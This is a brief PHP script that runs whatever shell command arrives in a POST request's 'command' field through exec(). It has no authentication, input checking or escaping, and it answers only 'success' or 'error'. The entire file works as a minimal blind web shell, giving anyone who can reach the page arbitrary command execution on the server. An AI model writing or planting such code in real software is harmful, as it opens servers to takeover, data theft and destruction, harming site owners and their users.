<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];
    exec($command, $output, $return_var);
    
    if ($return_var === 0) {
        echo 'success';
    } else {
        echo 'error';
    }
}
?>